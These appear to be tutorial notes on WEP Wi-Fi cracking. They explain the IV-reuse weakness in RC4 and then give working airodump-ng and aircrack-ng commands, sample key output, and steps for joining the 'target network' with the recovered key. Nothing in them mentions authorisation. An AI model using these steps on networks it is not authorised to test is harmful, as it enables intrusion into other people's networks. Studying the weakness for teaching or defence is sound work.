Gaining Access Theory behind Cracking WEP Encryption
WEP - Wired Equivalent Privacy
Uses an algorithm called RC4
Still used in some networks

WEP Cracking
Clients encrypts data using a key
Encrypted packet sent in the air
Router decrypts packet using the key

Client——>router ——>internet

WEP Cracking
A packet which is sent by client to router . This packet is encrypted using a unique key stream.
Random Initialisation vector (IV) is used to generate key streams
The initialisation vector is only 24 bits
IV + key(password) = key stream

Result
IV’s will repeat on busy networks
This makes WEP vulnerable to statistical attacks
Repeated IVs can be used to determine the key stream
And break the encryption

To crack WEP we need to:
Capture a large number of packets/IVs -> using airodump-ng
Analyse the captured IVs and crack the key -> using aircrack-ng

open a terminal and hit this command
airodump-ng --bssid F8:23:B2:B9:50:AB --channel 1 --write basic_wep mon0

In other terminal
First is to find the basic_wep file basic_wep-01.cap
aircrack-ng basic_wep-01.cap
When you hit the command it will tell whether the key found or not
It will show o/p like this
Key found ! 41:73:32:33:70 (ASCII: As23p)

Now Remove all the : from the key so we will get the key
4173323370

You can go to your computer and try to connect to the target network and give this password and it will work

This is how we break the encryption
